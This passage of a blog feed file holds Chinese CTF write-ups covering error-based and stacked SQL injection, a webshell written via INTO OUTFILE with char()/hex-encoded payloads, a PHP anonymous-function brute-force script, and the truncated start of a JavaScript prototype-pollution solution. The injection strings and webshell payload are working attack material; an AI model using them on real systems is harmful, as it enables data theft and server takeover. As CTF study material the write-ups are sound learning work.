            <tag> sql注入 </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> insert闭合 </tag>
            
            <tag> 十六进制编码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RootersCTF2019-babyWeb</title>
      <link href="/2025/04/29/RootersCTF2019-babyWeb/"/>
      <url>/2025/04/29/RootersCTF2019-babyWeb/</url>
      
        <content type="html"><![CDATA[<h1 id="RootersCTF2019-babyWeb"><a href="#RootersCTF2019-babyWeb" class="headerlink" title="RootersCTF2019-babyWeb"></a>RootersCTF2019-babyWeb</h1><p>首先页面告诉我们要找一串18个字符的数字然后输入进去，且告诉我们过滤了一些关键词，</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">banned <span class="hljs-built_in">words</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">characters</span> UNION SLEEP &#x27; <span class="hljs-string">&quot; OR - BENCHMARK</span><br></code></pre></td></tr></table></figure><p><img src="/../image/RootersCTF2019-babyWeb-1.png"></p><p>union被过滤了。但是他把我们的sql语句回显出来了，推测是存在报错注入。尝试一下</p><p>这里or被过滤了，可以用and或者||</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?<span class="hljs-keyword">search</span>=<span class="hljs-number">1</span>||updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">database</span>(),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<br>或者<br>?<span class="hljs-keyword">search</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">database</span>(),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>发现果然是报错注入。爆数据库名有回显</p><p><img src="/../image/RootersCTF2019-babyWeb-2.png"></p><p>然后就是慢慢构造爆出数据。</p><p>但是是这里过滤了单双引号，我们用where条件查询是需要用到单双引号的，但是这里可以使用十六进制编码来进行代替</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">例如：<span class="hljs-attribute">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> 和 <span class="hljs-attribute">table_name</span>=0x7573657273 功能一样<br></code></pre></td></tr></table></figure><p>构造payload：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">爆库：sql_injection<br><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">database</span>(),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)#<br>或者<br>用group_concat配合substr<br><span class="hljs-number">1</span>||updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,substr((<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">schema_name</span>) <span class="hljs-keyword">from</span> information_schema.schemata),<span class="hljs-number">32</span>,<span class="hljs-number">64</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)#<br>或者<br>用<span class="hljs-keyword">limit</span>控制回显<br><span class="hljs-number">1</span>||updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">schema_name</span> <span class="hljs-keyword">from</span> information_schema.schemata <span class="hljs-keyword">limit</span> <span class="hljs-number">2</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)#<br><br>爆表：users<br><span class="hljs-number">1</span>||updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)#<br><br>爆字段（列名）：<span class="hljs-keyword">USER</span> CURRENT_CONNECTIONS TOTAL_CONNECTIONS <span class="hljs-keyword">user</span> uniqueid<br><span class="hljs-number">1</span>||updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-number">0x7573657273</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>)#<br><br><br>由首页中回显的<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> uniqueid=<span class="hljs-number">1</span>，提示我们要查uniqueid字段的数据<br>爆数据<br><span class="hljs-number">1</span>||updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> uniqueid <span class="hljs-keyword">from</span> sql_injection.users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>)#<br></code></pre></td></tr></table></figure><p>爆出来一串数字</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">XPATH syntax error<span class="hljs-punctuation">:</span> &#x27;~<span class="hljs-number">83746152691836</span><span class="hljs-number">4526</span>&#x27;<br></code></pre></td></tr></table></figure><p>将数字输入到主页的输入框就能得到flag了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
            <tag> 报错注入 </tag>
            
            <tag> 十六进制编码绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SUCTF2018-annonymous</title>
      <link href="/2025/04/27/SUCTF2018-annonymous/"/>
      <url>/2025/04/27/SUCTF2018-annonymous/</url>
      
        <content type="html"><![CDATA[<h1 id="SUCTF2018-annonymous"><a href="#SUCTF2018-annonymous" class="headerlink" title="SUCTF2018-annonymous"></a>SUCTF2018-annonymous</h1><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$MY</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;die(`cat flag.php`);&quot;</span>);<br><span class="hljs-variable">$hash</span> = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">openssl_random_pseudo_bytes</span>(<span class="hljs-number">32</span>));<br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;function SUCTF_<span class="hljs-subst">$hash</span>()&#123;&quot;</span><br>    .<span class="hljs-string">&quot;global \$MY;&quot;</span><br>    .<span class="hljs-string">&quot;\$MY();&quot;</span><br>    .<span class="hljs-string">&quot;&#125;&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;func_name&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;func_name&quot;</span>]();<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><p>代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>  <br>  <br><span class="hljs-comment">// 使用 create_function 创建一个匿名函数，该函数调用 die() 函数并执行 `cat flag.php` 命令（在服务器上执行，如果PHP环境配置不当的话）。  </span><br><span class="hljs-comment">// 注意：`cat flag.php` 尝试读取名为 flag.php 的文件内容，这通常用于CTF（Capture The Flag）竞赛中，文件包含“flag”（即比赛的解决标志）。  </span><br><span class="hljs-comment">// 但直接在PHP中执行系统命令（如 `cat`）是危险的，特别是当命令来源不可控时。  </span><br><span class="hljs-variable">$MY</span> = <span class="hljs-title function_ invoke__">create_function</span>(<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;die(`cat flag.php`);&quot;</span>);  <br>  <br><span class="hljs-comment">// 生成一个随机的32字节字符串，并使用bin2hex函数将其转换为十六进制表示，用作函数名的前缀。  </span><br><span class="hljs-variable">$hash</span> = <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">openssl_random_pseudo_bytes</span>(<span class="hljs-number">32</span>));  <br>  <br><span class="hljs-comment">// 使用 eval() 函数动态地创建一个新函数，函数名为 &quot;SUCTF_&quot; 加上之前生成的随机哈希值。  </span><br><span class="hljs-comment">// 这个新函数全局调用之前创建的 $MY 匿名函数，即执行 `die(`cat flag.php`);`。  </span><br><span class="hljs-comment">// 使用 eval() 是非常危险的，因为它会执行任何传递给它的PHP代码。  </span><br><span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;function SUCTF_<span class="hljs-subst">$hash</span>()&#123;&quot;</span>  <br>    .<span class="hljs-string">&quot;global \$MY;&quot;</span> <span class="hljs-comment">// 声明使用全局变量 $MY  </span><br>    .<span class="hljs-string">&quot;\$MY();&quot;</span> <span class="hljs-comment">// 调用 $MY 匿名函数  </span><br>    .<span class="hljs-string">&quot;&#125;&quot;</span>);  <br>  <br><span class="hljs-comment">// 检查 $_GET[&#x27;func_name&#x27;] 是否被设置。  </span><br><span class="hljs-comment">// 如果设置了，则尝试调用对应的函数。这里存在一个严重的安全问题，因为它允许远程用户通过URL参数调用任意函数。  </span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;func_name&#x27;</span>]))&#123;  <br>    <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;func_name&quot;</span>](); <span class="hljs-comment">// 直接调用通过URL参数指定的函数  </span><br>    <span class="hljs-keyword">die</span>(); <span class="hljs-comment">// 调用后终止脚本  </span><br>&#125;  <br>  <br><span class="hljs-comment">// 如果没有通过URL传递func_name参数，则显示当前文件的源代码。  </span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br></code></pre></td></tr></table></figure><h2 id="知识点-匿名函数"><a href="#知识点-匿名函数" class="headerlink" title="知识点 匿名函数"></a>知识点 匿名函数</h2><p>当在调用执行create_function()创建匿名函数的时候，其实创建的函数是有名字的</p><p>格式为：%00lambda_%d，而%d则是一个计数器会递增，用来记录create_function()这个函数执行了多少次</p><p>所以我们可以通过调用哪个匿名函数(%d&#x3D;1)来实现cat flag.php的操作</p><hr><p>这道题中因为我们不知道前面有多少个匿名函数，所以得通过遍历数字来爆破，执行该函数</p><p>直接python脚本</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">import</span> requests<br> <br><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>):<br>    <span class="hljs-attribute">r</span>=requests.get(url=&#x27;http://fe702340-<span class="hljs-number">4</span>c4b-<span class="hljs-number">4339</span>-<span class="hljs-number">8</span>e50-<span class="hljs-number">3</span>b6d3db656f9.node5.buuoj.cn:<span class="hljs-number">81</span>/?func_name=%<span class="hljs-number">00</span>lambda_&#123;&#125;&#x27;.format(i))<br>    <span class="hljs-attribute">if</span> &#x27;flag&#x27; in r.text:<br>        <span class="hljs-attribute">print</span>(r.text)<br>        <span class="hljs-attribute">print</span>(i)<br>        <span class="hljs-attribute">break</span><br></code></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">E:\Python\python.exe E:\Python_study\CTF\BUU\test.py <br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//$flag=&quot;flag&#123;1196c299-5928-4db2-bd55-5319ff00be0c&#125;&quot;;</span><br><br><span class="hljs-number">15</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> creat_function </tag>
            
            <tag> 匿名函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SUCTF2018-MultiSQL</title>
      <link href="/2025/04/27/SUCTF2018-MultiSQL/"/>
      <url>/2025/04/27/SUCTF2018-MultiSQL/</url>
      
        <content type="html"><![CDATA[<h1 id="SUCTF2018-MultiSQL"><a href="#SUCTF2018-MultiSQL" class="headerlink" title="SUCTF2018-MultiSQL"></a>SUCTF2018-MultiSQL</h1><p><a href="https://blog.csdn.net/qq_46263951/article/details/119174694">原文链接</a></p><p>进去题目页面。</p><p><img src="/../image/SUCTF2018-MultiSQL-1.png"></p><p>查看网页源代码发现有注册登录页面</p><p><img src="/../image/SUCTF2018-MultiSQL-2.png"></p><p>随便注册一个用户，发现跳转到了<code>/user/user.php</code></p><p><img src="/../image/SUCTF2018-MultiSQL-3.png"></p><p>查看用户信息,发现有传参<code>/user/user.php?id=2</code></p><p><img src="/../image/SUCTF2018-MultiSQL-4.png"></p><p>在?id&#x3D;后存在一个sql盲注,我们来尝试一下<br><code>?id=2^(if(ascii(mid(user(),1,1))&gt;0,0,1))</code>判断存在注入，2异或0还是为2</p><p>经过fuzz测试后发现这里过滤了union，select ，&amp;，|，过滤了select然后存在堆叠注入的可以使用预处理注入，尝试写入shell，因为过滤了select等字符，使用char()绕过，需要执行的语句<br>select ‘<?php eval($_POST[_]);?>‘ into outfile ‘&#x2F;var&#x2F;www&#x2F;html&#x2F;favicon&#x2F;shell.php’;</p><h2 id="十进制ascii码绕过"><a href="#十进制ascii码绕过" class="headerlink" title="十进制ascii码绕过"></a>十进制ascii码绕过</h2><p>使用脚本编程十进制:</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">str</span>=<span class="hljs-string">&quot;select &#x27;&lt;?php eval(<span class="hljs-variable">$_POST</span>[_]);?&gt;&#x27; into outfile &#x27;/var/www/html/favicon/shell.php&#x27;;&quot;</span><br><span class="hljs-attribute">len_str</span>=len(str)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(0,len_str):<br><span class="hljs-keyword">if</span> i == 0:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;char(%s&#x27;</span>%ord(str[i]),<span class="hljs-attribute">end</span>=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;,%s&#x27;</span>%ord(str[i]),<span class="hljs-attribute">end</span>=<span class="hljs-string">&quot;&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;)&#x27;</span>)<br></code></pre></td></tr></table></figure><p>得到转十进制ascii码的结果：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">char</span>(<span class="hljs-number">115</span>,<span class="hljs-number">101</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>,<span class="hljs-number">32</span>,<span class="hljs-number">39</span>,<span class="hljs-number">60</span>,<span class="hljs-number">63</span>,<span class="hljs-number">112</span>,<span class="hljs-number">104</span>,<span class="hljs-number">112</span>,<span class="hljs-number">32</span>,<span class="hljs-number">101</span>,<span class="hljs-number">118</span>,<span class="hljs-number">97</span>,<span class="hljs-number">108</span>,<span class="hljs-number">40</span>,<span class="hljs-number">36</span>,<span class="hljs-number">95</span>,<span class="hljs-number">80</span>,<span class="hljs-number">79</span>,<span class="hljs-number">83</span>,<span class="hljs-number">84</span>,<span class="hljs-number">91</span>,<span class="hljs-number">95</span>,<span class="hljs-number">93</span>,<span class="hljs-number">41</span>,<span class="hljs-number">59</span>,<span class="hljs-number">63</span>,<span class="hljs-number">62</span>,<span class="hljs-number">39</span>,<span class="hljs-number">32</span>,<span class="hljs-number">105</span>,<span class="hljs-number">110</span>,<span class="hljs-number">116</span>,<span class="hljs-number">111</span>,<span class="hljs-number">32</span>,<span class="hljs-number">111</span>,<span class="hljs-number">117</span>,<span class="hljs-number">116</span>,<span class="hljs-number">102</span>,<span class="hljs-number">105</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">32</span>,<span class="hljs-number">39</span>,<span class="hljs-number">47</span>,<span class="hljs-number">118</span>,<span class="hljs-number">97</span>,<span class="hljs-number">114</span>,<span class="hljs-number">47</span>,<span class="hljs-number">119</span>,<span class="hljs-number">119</span>,<span class="hljs-number">119</span>,<span class="hljs-number">47</span>,<span class="hljs-number">104</span>,<span class="hljs-number">116</span>,<span class="hljs-number">109</span>,<span class="hljs-number">108</span>,<span class="hljs-number">47</span>,<span class="hljs-number">102</span>,<span class="hljs-number">97</span>,<span class="hljs-number">118</span>,<span class="hljs-number">105</span>,<span class="hljs-number">99</span>,<span class="hljs-number">111</span>,<span class="hljs-number">110</span>,<span class="hljs-number">47</span>,<span class="hljs-number">115</span>,<span class="hljs-number">104</span>,<span class="hljs-number">101</span>,<span class="hljs-number">108</span>,<span class="hljs-number">108</span>,<span class="hljs-number">46</span>,<span class="hljs-number">112</span>,<span class="hljs-number">104</span>,<span class="hljs-number">112</span>,<span class="hljs-number">39</span>,<span class="hljs-number">59</span>)<br></code></pre></td></tr></table></figure><p>构造payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">2</span>;<span class="hljs-keyword">set</span> <span class="hljs-variable">@sql</span><span class="hljs-operator">=</span><span class="hljs-type">char</span>(<span class="hljs-number">115</span>,<span class="hljs-number">101</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">99</span>,<span class="hljs-number">116</span>,<span class="hljs-number">32</span>,<span class="hljs-number">39</span>,<span class="hljs-number">60</span>,<span class="hljs-number">63</span>,<span class="hljs-number">112</span>,<span class="hljs-number">104</span>,<span class="hljs-number">112</span>,<span class="hljs-number">32</span>,<span class="hljs-number">101</span>,<span class="hljs-number">118</span>,<span class="hljs-number">97</span>,<span class="hljs-number">108</span>,<span class="hljs-number">40</span>,<span class="hljs-number">36</span>,<span class="hljs-number">95</span>,<span class="hljs-number">80</span>,<span class="hljs-number">79</span>,<span class="hljs-number">83</span>,<span class="hljs-number">84</span>,<span class="hljs-number">91</span>,<span class="hljs-number">95</span>,<span class="hljs-number">93</span>,<span class="hljs-number">41</span>,<span class="hljs-number">59</span>,<span class="hljs-number">63</span>,<span class="hljs-number">62</span>,<span class="hljs-number">39</span>,<span class="hljs-number">32</span>,<span class="hljs-number">105</span>,<span class="hljs-number">110</span>,<span class="hljs-number">116</span>,<span class="hljs-number">111</span>,<span class="hljs-number">32</span>,<span class="hljs-number">111</span>,<span class="hljs-number">117</span>,<span class="hljs-number">116</span>,<span class="hljs-number">102</span>,<span class="hljs-number">105</span>,<span class="hljs-number">108</span>,<span class="hljs-number">101</span>,<span class="hljs-number">32</span>,<span class="hljs-number">39</span>,<span class="hljs-number">47</span>,<span class="hljs-number">118</span>,<span class="hljs-number">97</span>,<span class="hljs-number">114</span>,<span class="hljs-number">47</span>,<span class="hljs-number">119</span>,<span class="hljs-number">119</span>,<span class="hljs-number">119</span>,<span class="hljs-number">47</span>,<span class="hljs-number">104</span>,<span class="hljs-number">116</span>,<span class="hljs-number">109</span>,<span class="hljs-number">108</span>,<span class="hljs-number">47</span>,<span class="hljs-number">102</span>,<span class="hljs-number">97</span>,<span class="hljs-number">118</span>,<span class="hljs-number">105</span>,<span class="hljs-number">99</span>,<span class="hljs-number">111</span>,<span class="hljs-number">110</span>,<span class="hljs-number">47</span>,<span class="hljs-number">115</span>,<span class="hljs-number">104</span>,<span class="hljs-number">101</span>,<span class="hljs-number">108</span>,<span class="hljs-number">108</span>,<span class="hljs-number">46</span>,<span class="hljs-number">112</span>,<span class="hljs-number">104</span>,<span class="hljs-number">112</span>,<span class="hljs-number">39</span>,<span class="hljs-number">59</span>);<span class="hljs-keyword">prepare</span> query <span class="hljs-keyword">from</span> <span class="hljs-variable">@sql</span>;<span class="hljs-keyword">execute</span> query;<br></code></pre></td></tr></table></figure><p>这里使用了prepare预处理语句</p><p>进入shell页面<code>node4.buuoj.cn/favicon/shell.php</code></p><p>然后post传参</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">_</span>=system(<span class="hljs-string">&#x27;cat /WelL_Th1s_14_fl4g&#x27;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>得到flag</p><h2 id="十六进制编码绕过"><a href="#十六进制编码绕过" class="headerlink" title="十六进制编码绕过"></a>十六进制编码绕过</h2><p>也可以使用十六进制编码payload:</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[_]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27; into outfile &#x27;/var/www/html/favicon/muma.php&#x27;</span><br><span class="language-xml"></span><br><span class="language-xml">0x73656c65637420273c3f706870206576616c28245f504f53545b5f5d293b3f3e2720696e746f206f757466696c6520272f7661722f7777772f68746d6c2f66617669636f6e2f6d756d612e70687027</span><br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">2</span>;<span class="hljs-keyword">set</span> <span class="hljs-variable">@sql</span><span class="hljs-operator">=</span><span class="hljs-number">0x73656c65637420273c3f706870206576616c28245f504f53545b5f5d293b3f3e2720696e746f206f757466696c6520272f7661722f7777772f68746d6c2f66617669636f6e2f6d756d612e70687027</span>;<span class="hljs-keyword">prepare</span> query <span class="hljs-keyword">from</span> <span class="hljs-variable">@sql</span>;<span class="hljs-keyword">execute</span> query;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> getshell </tag>
            
            <tag> 布尔盲注 </tag>
            
            <tag> 堆叠注入 </tag>
            
            <tag> sql预处理 </tag>
            
            <tag> selet into outfile </tag>
            
            <tag> char绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GYCTF2020-Ez_Express</title>
      <link href="/2025/04/27/GYCTF2020-Ez-Express/"/>
      <url>/2025/04/27/GYCTF2020-Ez-Express/</url>
      
        <content type="html"><![CDATA[<h1 id="GYCTF2020-Ez-Express"><a href="#GYCTF2020-Ez-Express" class="headerlink" title="GYCTF2020-Ez_Express"></a>GYCTF2020-Ez_Express</h1><p>原文链接：<a href="https://blog.csdn.net/qq_45691294/article/details/109320437">https://blog.csdn.net/qq_45691294/article/details/109320437</a></p><p>打开题目，看到一个登录注册表单，然后右边提示</p><p><img src="/../image/GYCTF2020-Ez_Express-1.png"></p><p>先随便注册一个号，然后登录进去。发现是个空白页面，查看下网页源代码，提示我们下载<a href="http://www.zip得到源码/">www.zip得到源码</a><br><img src="/../image/GYCTF2020-Ez_Express-2.png"></p><p>然后发现是js代码审计，只能看大佬的wp了。</p><p>关键源码在<code>app.js</code>和<code>index.js</code>中，开始代码审计</p><p>&#x2F;route&#x2F;index.js中用了<code>merge()</code>和<code>clone()</code>，所以这题是考原型链</p><hr><h2 id="原型链概念"><a href="#原型链概念" class="headerlink" title="原型链概念"></a>原型链概念</h2><p>在 Javascript，每一个实例对象都有一个<code>prototype</code>属性，<code>prototype</code> 属性</p><p>可以向对象添加属性和方法。</p><p>object.prototype.name&#x3D;value</p><p>在 Javascript，每一个实例对象都有一个<code>__proto__</code>属性，这个实例属性 指向对象的原型对象(即原型)。可以通过以下方式访问得到某一实例对 象的原型对象：</p><p><code>objectname[&quot;__proto__&quot;]</code></p><p><code>objectname.__proto__</code></p><p><code>objectname.constructor.prototype</code></p><p>污染原理</p><p>object[a][b] &#x3D; value 如果可以控制a、b、value的值，将a设置为 proto，我们就可以给object对象的原型设置一个b属性，值为value。这样 所有继承object对象原型的实例对象在本身不拥有b属性的情况下，都会拥有b 属性，且值为value。</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ceylon"><span class="hljs-keyword">object</span><span class="hljs-number">1</span> = &#123;<span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;b&quot;</span>:<span class="hljs-number">2</span>&#125;;<br><span class="hljs-keyword">object</span><span class="hljs-number">1._</span><span class="hljs-number">_p</span>roto<span class="hljs-number">__</span>.foo = <span class="hljs-string">&quot;hhh&quot;</span>;<span class="hljs-comment">//直接修改原型，添加foo</span><br>console.log.(<span class="hljs-keyword">object</span><span class="hljs-number">1</span>.foo);<br><span class="hljs-keyword">object</span><span class="hljs-number">2</span> = &#123;<span class="hljs-string">&quot;c&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;d&quot;</span>:<span class="hljs-number">2</span>&#125;;<br>console.log(<span class="hljs-keyword">object</span><span class="hljs-number">2</span>.foo);<span class="hljs-comment">//本身没找到，就去原型里找</span><br></code></pre></td></tr></table></figure><p>具体参考p师傅的文章<br><a href="https://www.cnblogs.com/escape-w/p/12347705.html">初探JavaScript原型链污染</a><br>以下代码存在原型链污染漏洞</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs r">const merge <span class="hljs-operator">=</span> <span class="hljs-punctuation">(</span>a<span class="hljs-punctuation">,</span> b<span class="hljs-punctuation">)</span> <span class="hljs-operator">=</span><span class="hljs-operator">&gt;</span> <span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-keyword">for</span> <span class="hljs-punctuation">(</span>var <span class="hljs-built_in">attr</span> <span class="hljs-keyword">in</span> b<span class="hljs-punctuation">)</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-punctuation">(</span>isObject<span class="hljs-punctuation">(</span>a<span class="hljs-punctuation">[</span><span class="hljs-built_in">attr</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">)</span> <span class="hljs-operator">&amp;&amp;</span> isObject<span class="hljs-punctuation">(</span>b<span class="hljs-punctuation">[</span><span class="hljs-built_in">attr</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span> <span class="hljs-punctuation">&#123;</span><br>      merge<span class="hljs-punctuation">(</span>a<span class="hljs-punctuation">[</span><span class="hljs-built_in">attr</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> b<span class="hljs-punctuation">[</span><span class="hljs-built_in">attr</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">)</span>;<br>    <span class="hljs-punctuation">&#125;</span> <span class="hljs-keyword">else</span> <span 